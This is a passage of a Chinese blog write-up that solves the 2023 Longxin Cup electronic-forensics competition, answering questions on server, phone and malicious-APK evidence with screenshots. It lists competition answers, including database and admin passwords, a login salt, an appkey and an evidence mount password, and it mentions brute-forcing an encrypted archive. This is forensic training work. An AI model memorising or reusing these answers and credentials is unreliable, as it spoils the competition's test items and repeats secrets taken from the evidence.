plaintext"><table><tr><td class="code"><pre><span class="line">12320</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427996.png" alt="image-20241005200452383"></p><p>仿真后用命令也能看</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427997.png" alt="image-20241005202331589"></p><h5 id="3-分析服务器检材，服务器docker内有多少个镜像。-标准格式：100"><a href="#3-分析服务器检材，服务器docker内有多少个镜像。-标准格式：100" class="headerlink" title="3  分析服务器检材，服务器docker内有多少个镜像。[标准格式：100]"></a>3  分析服务器检材，服务器docker内有多少个镜像。[标准格式：100]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427998.png" alt="image-20241005200509633"></p><p>命令看</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427999.png" alt="image-20241005202401543"></p><h5 id="4-分析服务器检材，服务器内sqlserver默认账号的密码是？-标准格式：xxx"><a href="#4-分析服务器检材，服务器内sqlserver默认账号的密码是？-标准格式：xxx" class="headerlink" title="4  分析服务器检材，服务器内sqlserver默认账号的密码是？[标准格式：xxx]"></a>4  分析服务器检材，服务器内sqlserver默认账号的密码是？[标准格式：xxx]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;i7uFtnkTv8&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427000.png" alt="image-20241005202657398"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427001.png" alt="image-20241005203336250"></p><h5 id="5-分析服务器检材，服务器内sqlserver存放了阿里云存储下载地址，该下载地址是？-标准格式：https-xxx"><a href="#5-分析服务器检材，服务器内sqlserver存放了阿里云存储下载地址，该下载地址是？-标准格式：https-xxx" class="headerlink" title="5  分析服务器检材，服务器内sqlserver存放了阿里云存储下载地址，该下载地址是？[标准格式：https://xxx]"></a>5  分析服务器检材，服务器内sqlserver存放了阿里云存储下载地址，该下载地址是？[标准格式：<a href="https://xxx]">https://xxx]</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xinfenfa.oss-accelerate.aliyuncs.com</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427002.png" alt="image-20241005214323986"></p><h5 id="6-分析服务器检材，服务器内sqlserver内“cmf-user-action-log”表，表内存在的用户操作日志，一共操作次数是多少？-标准格式：100"><a href="#6-分析服务器检材，服务器内sqlserver内“cmf-user-action-log”表，表内存在的用户操作日志，一共操作次数是多少？-标准格式：100" class="headerlink" title="6  分析服务器检材，服务器内sqlserver内“cmf_user_action_log”表，表内存在的用户操作日志，一共操作次数是多少？[标准格式：100]"></a>6  分析服务器检材，服务器内sqlserver内“cmf_user_action_log”表，表内存在的用户操作日志，一共操作次数是多少？[标准格式：100]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">99684318</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427003.png" alt="image-20241005203726185"></p><p>counts是操作次数</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427004.png" alt="image-20241005203906844"></p><h5 id="7-分析服务器检材，该服务器正在使用的数据库的持久化目录是什么？-标准格式：-xxx-xxx"><a href="#7-分析服务器检材，该服务器正在使用的数据库的持久化目录是什么？-标准格式：-xxx-xxx" class="headerlink" title="7  分析服务器检材，该服务器正在使用的数据库的持久化目录是什么？[标准格式：&#x2F;xxx&#x2F;xxx]"></a>7  分析服务器检材，该服务器正在使用的数据库的持久化目录是什么？[标准格式：&#x2F;xxx&#x2F;xxx]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data/mongo</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427005.png" alt="image-20241005205552246"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427006.png" alt="image-20241005205631022"></p><h5 id="8-分析服务器检材，该网站后台正在使用的数据库有多少个集合？-标准格式：100"><a href="#8-分析服务器检材，该网站后台正在使用的数据库有多少个集合？-标准格式：100" class="headerlink" title="8  分析服务器检材，该网站后台正在使用的数据库有多少个集合？[标准格式：100]"></a>8  分析服务器检材，该网站后台正在使用的数据库有多少个集合？[标准格式：100]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">13</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427007.png" alt="image-20241005205713785"></p><h5 id="9-分析服务器检材，该网站的后台登录地址是？-标准格式：-xxx-xxx-xxx-全小写，不加域名"><a href="#9-分析服务器检材，该网站的后台登录地址是？-标准格式：-xxx-xxx-xxx-全小写，不加域名" class="headerlink" title="9  分析服务器检材，该网站的后台登录地址是？[标准格式：&#x2F;xxx&#x2F;xxx.xxx 全小写，不加域名]"></a>9  分析服务器检材，该网站的后台登录地址是？[标准格式：&#x2F;xxx&#x2F;xxx.xxx 全小写，不加域名]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/appmanager/common/login.shtml</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427008.png" alt="image-20241005205812087"></p><p>这个是禁用的，要看日志</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427009.png" alt="image-20241005231642051"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427010.png" alt="image-20241005231700126"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427011.png" alt="image-20241005231646976"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427012.png" alt="image-20241005233529093"></p><h5 id="10-分析服务器检材，该网站后台使用的管理员加密算法是？-标准格式：全大写"><a href="#10-分析服务器检材，该网站后台使用的管理员加密算法是？-标准格式：全大写" class="headerlink" title="10  分析服务器检材，该网站后台使用的管理员加密算法是？[标准格式：全大写]"></a>10  分析服务器检材，该网站后台使用的管理员加密算法是？[标准格式：全大写]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BCRYPT</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427013.png" alt="image-20241005210019757"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427014.png" alt="image-20241005210040278"></p><p>或者gpt做法，直接把数据库里的密码丢给gpt判断</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427016.png" alt="image-20241005210220812"></p><h5 id="11-分析服务器检材，该网站最早使用超级管理员进行删除管理员操作的IP地址是？-标准格式：x-x-x-x"><a href="#11-分析服务器检材，该网站最早使用超级管理员进行删除管理员操作的IP地址是？-标准格式：x-x-x-x" class="headerlink" title="11  分析服务器检材，该网站最早使用超级管理员进行删除管理员操作的IP地址是？[标准格式：x.x.x.x]"></a>11  分析服务器检材，该网站最早使用超级管理员进行删除管理员操作的IP地址是？[标准格式：x.x.x.x]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">117.132.191.203</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427017.png" alt="image-20241005212612949"></p><h5 id="12-分析服务器检材，该网站后台上传过sha256值为“b204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1”的压缩包文件，该文件内的账单交易订单号是多少？-标准格式：123456"><a href="#12-分析服务器检材，该网站后台上传过sha256值为“b204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1”的压缩包文件，该文件内的账单交易订单号是多少？-标准格式：123456" class="headerlink" title="12  分析服务器检材，该网站后台上传过sha256值为“b204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1”的压缩包文件，该文件内的账单交易订单号是多少？[标准格式：123456]"></a>12  分析服务器检材，该网站后台上传过sha256值为“b204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1”的压缩包文件，该文件内的账单交易订单号是多少？[标准格式：123456]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20240321000000005443369778283185</span><br></pre></td></tr></table></figure><p>上传路径在\uploads\admin\admin_thumb\下面</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427018.png" alt="image-20241005212905697"></p><p>有加密，passware爆破</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427019.png" alt="image-20241005213101394"></p><p>base64转图片</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427020.png" alt="image-20241005213134799"></p><h5 id="13-分析服务器检材，该网站存在网站数据库备份功能，该功能的接口地址是？-标准格式：-xxx-xxx-全小写，不加域名"><a href="#13-分析服务器检材，该网站存在网站数据库备份功能，该功能的接口地址是？-标准格式：-xxx-xxx-全小写，不加域名" class="headerlink" title="13  分析服务器检材，该网站存在网站数据库备份功能，该功能的接口地址是？[标准格式：&#x2F;xxx&#x2F;xxx 全小写，不加域名]"></a>13  分析服务器检材，该网站存在网站数据库备份功能，该功能的接口地址是？[标准格式：&#x2F;xxx&#x2F;xxx 全小写，不加域名]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/appmanger/databackup</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427021.png" alt="image-20241005215104846"></p><p>先登录后台，就能访问到了&#x2F;appmanger&#x2F;Databackup</p><h5 id="14-分析服务器检材，该网站存放银行卡信息数据表中，其中信息数量前十的公司对应旗下visa银行卡一共有多少金额？-标准格式：100-00"><a href="#14-分析服务器检材，该网站存放银行卡信息数据表中，其中信息数量前十的公司对应旗下visa银行卡一共有多少金额？-标准格式：100-00" class="headerlink" title="14  分析服务器检材，该网站存放银行卡信息数据表中，其中信息数量前十的公司对应旗下visa银行卡一共有多少金额？[标准格式：100.00]"></a>14  分析服务器检材，该网站存放银行卡信息数据表中，其中信息数量前十的公司对应旗下visa银行卡一共有多少金额？[标准格式：100.00]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">21558432.160000093</span><br></pre></td></tr></table></figure><p>先统计信息数量前十的公司是哪些，再筛选出旗下visa银行卡，visa银行卡卡号开头为4，最后求和</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427022.png" alt="image-20241005235701355"></p><h5 id="15-分析服务器检材，该网站在2023年二月一共获取了多少条通信记录？-标准标准格式：100"><a href="#15-分析服务器检材，该网站在2023年二月一共获取了多少条通信记录？-标准标准格式：100" class="headerlink" title="15  分析服务器检材，该网站在2023年二月一共获取了多少条通信记录？[标准标准格式：100]"></a>15  分析服务器检材，该网站在2023年二月一共获取了多少条通信记录？[标准标准格式：100]</h5><p>2879</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427023.png" alt="image-20241005235945592"></p><h5 id="16-分析服务器检材，该网站的一条管理员信息存在数据篡改，请分析是哪个管理员信息遭到篡改，该管理员用户名是？-标准格式：ABCDE"><a href="#16-分析服务器检材，该网站的一条管理员信息存在数据篡改，请分析是哪个管理员信息遭到篡改，该管理员用户名是？-标准格式：ABCDE" class="headerlink" title="16  分析服务器检材，该网站的一条管理员信息存在数据篡改，请分析是哪个管理员信息遭到篡改，该管理员用户名是？[标准格式：ABCDE]"></a>16  分析服务器检材，该网站的一条管理员信息存在数据篡改，请分析是哪个管理员信息遭到篡改，该管理员用户名是？[标准格式：ABCDE]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xYpMLuROhNl</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427024.png" alt="image-20241006000116529"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 龙信杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023龙信杯复现</title>
      <link href="/2024/09/29/2023%E9%BE%99%E4%BF%A1%E6%9D%AF%E5%8F%96%E8%AF%81/"/>
      <url>/2024/09/29/2023%E9%BE%99%E4%BF%A1%E6%9D%AF%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h2 id="赛前复现2023龙信杯"><a href="#赛前复现2023龙信杯" class="headerlink" title="赛前复现2023龙信杯"></a>赛前复现2023龙信杯</h2><p>2023年龙信检材挂载密码：RLEQc2Xe65Q5GiCuRNMFrw&#x3D;&#x3D;</p><p>参考wp：</p><ol><li><a href="https://blog.csdn.net/weixin_72667582/article/details/133338671">2023年第一届龙信杯电子数据取证竞赛(流量+服务器部分)</a></li><li><a href="https://blog.csdn.net/Tummyiii/article/details/133497561">2023年第一届“龙信杯”电子数据取证竞赛</a></li><li><a href="https://blog.csdn.net/m0_73605862/article/details/133365205">2023龙信杯虚拟币分析</a></li><li><a href="https://blog.csdn.net/m0_73605862/article/details/133467052">2023龙信杯流量分析wp</a></li><li><a href="https://www.cnblogs.com/WXjzc/p/17728788.html">2023龙信杯    </a></li><li><a href="https://blog.csdn.net/jyttttttt/article/details/133277186?spm=1001.2014.3001.5502">第一届“龙信杯”电子数据取证竞赛Writeup</a></li></ol><h3 id="案情介绍"><a href="#案情介绍" class="headerlink" title="案情介绍"></a>案情介绍</h3><blockquote><p>​2023年9月，某公安机关指挥中心接受害人报案:通过<strong>即时通讯工具</strong>添加认识一位叫“<strong>周微</strong>”的女人，两人谈论甚欢，确定网上恋爱关系，后邀约<strong>裸聊</strong>，受害人上钩后，“周微”和受害人进行裸聊，整个过程被涉诈团伙<strong>录音录像</strong>。同时周倩以自己做直播“涨粉”为由，引导受害人下载其事先制作好的<strong>木马APP</strong>，受害人安装该APP后，嫌疑人利用<strong>录制的视频</strong>和受害人的<strong>通讯录</strong>做要挟，从而实施诈骗。</p><p>​公安机关接警后，通过技术手段抓取了一段<strong>流量包</strong>，且通过公安机关的侦查与分析，锁定了该<strong>诈骗团伙</strong>的<strong>业务窝点</strong>，具了解，该团伙成员通过<strong>Telegram</strong> 联系<strong>ETH币商收币</strong>，双方在线上确定好了<strong>交易时间</strong>和<strong>交易金额（交易额为300万人民币）</strong>，<strong>并先由卖币方转0.5个ETH到买币方钱包</strong>。双方人员碰头后，商定分<strong>两笔</strong>交易交割，第一笔交易价值<strong>100万</strong>的虚拟货币、第二笔交易价值<strong>200万</strong>的虚拟货币。第一笔100万的币从卖币方的地址转到<strong>中转地址</strong>（由中间人控制），再由中转地址转到买币方提供的<strong>收币地址</strong>，买币方收到币后将带来的100万现金给卖币方清点，第一笔交易完成。 犯罪分子开始第二笔交易时，被警方当场截获。并将相关嫌疑人抓获，扣押<strong>安卓手机1部</strong>，<strong>笔记本电脑1台</strong>，<strong>调证服务器2台</strong>，以上检材以分别制作了镜像。检材清单见附件。请结合案情，对上述检材进行勘验与分析，完成以下题目。</p></blockquote><h3 id="检材清单"><a href="#检材清单" class="headerlink" title="检材清单"></a><strong>检材清单</strong></h3><table><thead><tr><th><em><strong>*对象*</strong></em></th><th><em><strong>*检材类型*</strong></em></th><th><em><strong>*检材名称*</strong></em></th></tr></thead><tbody><tr><td>嫌疑人</td><td>电脑</td><td>计算机镜像.7z（大小：14.3 GB，MD5：97b5ba6df341dce41ff635431d60f0cd）</td></tr><tr><td>手机</td><td>手机镜像.7z（大小：9.95 GB，MD5：98338c50d7642e16f81f0d81dc8325da）</td><td></td></tr><tr><td>调正数据</td><td>服务器1</td><td>服务器镜像1.7z（大小：1.60 GB，MD5：fddefefa05a053d9233b049b6615264c）</td></tr><tr><td>服务器2</td><td>服务器镜像2.7z（大小：2.70 GB，MD5：b5ccf6f93825f78463cecd007f2f9c7b）</td><td></td></tr><tr><td>公司</td><td>流量包</td><td>流量包.7z（大小：80.3 MB，MD5：2144d3397e03e0220bdb44a1df58dfbb）</td></tr></tbody></table><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h4><h5 id="id-1-名称-请分析涉案手机的设备标识是-。（标准格式：12345678）"><a href="#id-1-名称-请分析涉案手机的设备标识是-。（标准格式：12345678）" class="headerlink" title="id:1  名称:请分析涉案手机的设备标识是_______。（标准格式：12345678）"></a>id:1  名称:请分析涉案手机的设备标识是_______。（标准格式：12345678）</h5><p>85069625</p><p>弘连只能取出来app信息</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926215947435.png" alt="image-20240926215947435"></p><h5 id="id-2-名称-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）"><a href="#id-2-名称-请确认嫌疑人首次安装目标APP的安装时间是-。（标准格式：2023-09-13-11-32-23）" class="headerlink" title="id:2  名称:请确认嫌疑人首次安装目标APP的安装时间是______。（标准格式：2023-09-13.11:32:23）"></a>id:2  名称:请确认嫌疑人首次安装目标APP的安装时间是______。（标准格式：2023-09-13.11:32:23）</h5><p>2022-11-16.19:11:26</p><p>错误答案：2022-11-17.23:24:21</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926222901608.png" alt="image-20240926222901608"></p><p>可能是解压过程文件丢失了，不懂为什么没有</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928233808723.png" alt="image-20240928233808723"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928233757080.png" alt="image-20240928233757080"></p><h5 id="id-3-名称-此检材共连接过-个WiFi。（标准格式：1）"><a href="#id-3-名称-此检材共连接过-个WiFi。（标准格式：1）" class="headerlink" title="id:3  名称:此检材共连接过______个WiFi。（标准格式：1）"></a>id:3  名称:此检材共连接过______个WiFi。（标准格式：1）</h5><p>6</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926220729204.png" alt="image-20240926220729204"></p><h5 id="id-4-名称-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）"><a href="#id-4-名称-嫌疑人手机短信记录中未读的短信共有-条。（标准格式：12）" class="headerlink" title="id:4  名称:嫌疑人手机短信记录中未读的短信共有______条。（标准格式：12）"></a>id:4  名称:嫌疑人手机短信记录中未读的短信共有______条。（标准格式：12）</h5><p>17</p><p>错误答案：8</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926225304713.png" alt="image-20240926225304713"></p><p>忘记设置列这个功能了</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928234125136.png" alt="image-20240928234125136"></p><h5 id="id-5-名称-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）"><a href="#id-5-名称-嫌疑人检材手机在浏览器中下载海报背景图的网址是-。（标准格式：http-www-baidu-com-admin-index-html）" class="headerlink" title="id:5  名称:嫌疑人检材手机在浏览器中下载海报背景图的网址是_______。（标准格式：http://www.baidu.com/admin/index.html）"></a>id:5  名称:嫌疑人检材手机在浏览器中下载海报背景图的网址是_______。（标准格式：<a href="http://www.baidu.com/admin/index.html%EF%BC%89">http://www.baidu.com/admin/index.html）</a></h5><p><a href="http://m.ziyuanhu.com/pics/1725.html">http://m.ziyuanhu.com/pics/1725.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926221331603.png" alt="image-20240926221331603"></p><h5 id="id-6-名称-请分析涉案海报的推广ID是-。（标准格式：123456）"><a href="#id-6-名称-请分析涉案海报的推广ID是-。（标准格式：123456）" class="headerlink" title="id:6  名称:请分析涉案海报的推广ID是________。（标准格式：123456）"></a>id:6  名称:请分析涉案海报的推广ID是________。（标准格式：123456）</h5><p>114092</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926221354179.png" alt="image-20240926221354179"></p><h5 id="id-7-名称-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）"><a href="#id-7-名称-嫌疑人通过短信群发去推广APP，请问收件人中有-个号码是无效的。（标准格式：12）" class="headerlink" title="id:7  名称:嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）"></a>id:7  名称:嫌疑人通过短信群发去推广APP，请问收件人中有__个号码是无效的。（标准格式：12）</h5><p>1</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926225846493.png" alt="image-20240926225846493"></p><h5 id="id-8-名称-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）"><a href="#id-8-名称-通过分析，嫌疑人推送的微信账号是-。（标准格式：Lx20230916）" class="headerlink" title="id:8  名称:通过分析，嫌疑人推送的微信账号是______。（标准格式：Lx20230916）"></a>id:8  名称:通过分析，嫌疑人推送的微信账号是______。（标准格式：Lx20230916）</h5><p>Gq20221101</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926221900473.png" alt="image-20240926221900473"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926221702432.png" alt="image-20240926221702432"></p><h5 id="id-9-名称-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）"><a href="#id-9-名称-请校验嫌疑人使用的“变声器”APK的包名是-。（标准格式：com-baidu-com）" class="headerlink" title="id:9  名称:请校验嫌疑人使用的“变声器”APK的包名是________。（标准格式：com.baidu.com）"></a>id:9  名称:请校验嫌疑人使用的“变声器”APK的包名是________。（标准格式：com.baidu.com）</h5><p>com.chuci.voice</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926222004560.png" alt="image-20240926222004560"></p><h5 id="id-10-名称-号商的联系人注册APP的ID是-。（标准格式：12345678）"><a href="#id-10-名称-号商的联系人注册APP的ID是-。（标准格式：12345678）" class="headerlink" title="id:10  名称:号商的联系人注册APP的ID是_________。（标准格式：12345678）"></a>id:10  名称:号商的联系人注册APP的ID是_________。（标准格式：12345678）</h5><p>36991915</p><p>错误答案：15563523</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926222030293.png" alt="image-20240926222030293"></p><p>找错了，应该找ID不是账号</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928234356924.png" alt="image-20240928234356924"></p><h5 id="id-11-名称-嫌疑人于2022年11月份在-城市。（标准格式：成都）"><a href="#id-11-名称-嫌疑人于2022年11月份在-城市。（标准格式：成都）" class="headerlink" title="id:11  名称:嫌疑人于2022年11月份在_______城市。（标准格式：成都）"></a>id:11  名称:嫌疑人于2022年11月份在_______城市。（标准格式：成都）</h5><p>苏州</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926222614483.png" alt="image-20240926222614483"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926222558662.png" alt="image-20240926222558662"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926222549446.png" alt="image-20240926222549446"></p><h5 id="id-12-名称-嫌疑人共购买-个QQ号。（标准格式：1）"><a href="#id-12-名称-嫌疑人共购买-个QQ号。（标准格式：1）" class="headerlink" title="id:12  名称:嫌疑人共购买_______个QQ号。（标准格式：1）"></a>id:12  名称:嫌疑人共购买_______个QQ号。（标准格式：1）</h5><p>8</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926222650749.png" alt="image-20240926222650749"></p><h4 id="APK取证"><a href="#APK取证" class="headerlink" title="APK取证"></a>APK取证</h4><h5 id="id-1-名称-分析手机镜像，导出涉案apk，此apk的md5值是-。（标准格式：abc123）"><a href="#id-1-名称-分析手机镜像，导出涉案apk，此apk的md5值是-。（标准格式：abc123）" class="headerlink" title="id:1 名称:分析手机镜像，导出涉案apk，此apk的md5值是________。（标准格式：abc123）"></a>id:1 名称:分析手机镜像，导出涉案apk，此apk的md5值是________。（标准格式：abc123）</h5><p>d56e1574c1e48375256510c58c2e92e5</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926225128931.png" alt="image-20240926225128931"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926225914868.png" alt="image-20240926225914868"></p><h5 id="id-2-名称-分析该apk，apk的包名是-。（标准格式：com-qqj-123）"><a href="#id-2-名称-分析该apk，apk的包名是-。（标准格式：com-qqj-123）" class="headerlink" title="id:2 名称:分析该apk，apk的包名是________。（标准格式：com.qqj.123）"></a>id:2 名称:分析该apk，apk的包名是________。（标准格式：com.qqj.123）</h5><p>lx.tiantian.com</p><p>同上</p><h5 id="id-3-名称-分析该apk，app的内部版本号是-。（标准格式：1-1）"><a href="#id-3-名称-分析该apk，app的内部版本号是-。（标准格式：1-1）" class="headerlink" title="id:3 名称:分析该apk，app的内部版本号是__________。（标准格式：1.1）"></a>id:3 名称:分析该apk，app的内部版本号是__________。（标准格式：1.1）</h5><p>1.0</p><p>同上</p><h5 id="id-4-名称-分析该apk，请问该apk最高支持运行的安卓版本是-。（标准格式：11）"><a href="#id-4-名称-分析该apk，请问该apk最高支持运行的安卓版本是-。（标准格式：11）" class="headerlink" title="id:4 名称:分析该apk，请问该apk最高支持运行的安卓版本是_______。（标准格式：11）"></a>id:4 名称:分析该apk，请问该apk最高支持运行的安卓版本是_______。（标准格式：11）</h5><p>12</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926230132371.png" alt="image-20240926230132371"></p><h5 id="id-5-名称-分析该apk，app的主函数入口是-。（标准格式：com-qqj-123-MainActivity）"><a href="#id-5-名称-分析该apk，app的主函数入口是-。（标准格式：com-qqj-123-MainActivity）" class="headerlink" title="id:5 名称:分析该apk，app的主函数入口是_________。（标准格式：com.qqj.123.MainActivity）"></a>id:5 名称:分析该apk，app的主函数入口是_________。（标准格式：com.qqj.123.MainActivity）</h5><p>lx.tiantian.com.activity.MainActivity</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926230837899.png" alt="image-20240926230837899"></p><h5 id="id-6-名称-分析该apk，请问窃取短信的权限名称是-。（标准格式：android-permission-NETWORK）"><a href="#id-6-名称-分析该apk，请问窃取短信的权限名称是-。（标准格式：android-permission-NETWORK）" class="headerlink" title="id:6 名称:分析该apk，请问窃取短信的权限名称是________。（标准格式：android.permission.NETWORK）"></a>id:6 名称:分析该apk，请问窃取短信的权限名称是________。（标准格式：android.permission.NETWORK）</h5><p>android.permission.READ_SMS</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926230900210.png" alt="image-20240926230900210"></p><h5 id="id-7-名称-APP使用的OPPO的appkey值是-。（标准格式：AB-12345678）"><a href="#id-7-名称-APP使用的OPPO的appkey值是-。（标准格式：AB-12345678）" class="headerlink" title="id:7 名称:APP使用的OPPO的appkey值是________。（标准格式：AB-12345678）"></a>id:7 名称:APP使用的OPPO的appkey值是________。（标准格式：AB-12345678）</h5><p>OP-264m10v633PC8ws8cwOOc4c0w</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926230922919.png" alt="image-20240926230922919"></p><h5 id="id-8-名称-分析apk源码，该APK后台地址是-。（标准格式：com-qqj-123）"><a href="#id-8-名称-分析apk源码，该APK后台地址是-。（标准格式：com-qqj-123）" class="headerlink" title="id:8 名称:分析apk源码，该APK后台地址是________。（标准格式：com.qqj.123）"></a>id:8 名称:分析apk源码，该APK后台地址是________。（标准格式：com.qqj.123）</h5><p>app.goyasha.com</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926231925726.png" alt="image-20240926231925726"></p><h5 id="id-9-名称-分析apk源码，APP-后台地址登录的盐值是-。（标准格式：123abc-）"><a href="#id-9-名称-分析apk源码，APP-后台地址登录的盐值是-。（标准格式：123abc-）" class="headerlink" title="id:9 名称:分析apk源码，APP 后台地址登录的盐值是_______。（标准格式：123abc&#x3D;%$&amp;）"></a>id:9 名称:分析apk源码，APP 后台地址登录的盐值是_______。（标准格式：123abc&#x3D;%$&amp;）</h5><p>73g&#x3D;s%!lvi8h&#x3D;i7a4ge*o3s@h2n^5_yk&#x3D;-y#@p6)feidfjol8@</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240926231937805.png" alt="image-20240926231937805"></p><h5 id="id-10-名称-分析apk源码，该APK后台地址登录密码是-。（标准格式：longxin123）"><a href="#id-10-名称-分析apk源码，该APK后台地址登录密码是-。（标准格式：longxin123）" class="headerlink" title="id:10 名称:分析apk源码，该APK后台地址登录密码是______。（标准格式：longxin123）"></a>id:10 名称:分析apk源码，该APK后台地址登录密码是______。（标准格式：longxin123）</h5><p>lxtiantiancom</p><p>同上</p><h5 id="id-11-名称-对-APP-安装包进行分析，该-APP打包平台调证值是-。（标准格式：HER45678）"><a href="#id-11-名称-对-APP-安装包进行分析，该-APP打包平台调证值是-。（标准格式：HER45678）" class="headerlink" title="id:11 名称:对 APP 安装包进行分析，该 APP打包平台调证值是______。（标准格式：HER45678）"></a>id:11 名称:对 APP 安装包进行分析，该 APP打包平台调证值是______。（标准格式：HER45678）</h5><p>H5D9D11EA</p><p>唯一像答案的就是这个了，但是我不太清楚DCLOUD_AD_ID是什么意思</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240928235434225.png" alt="image-20240928235434225"></p><h5 id="id-12-名称-此apk抓包获取到的可访问网站域名IP地址是-。（标准格式：192-168-1-1）"><a 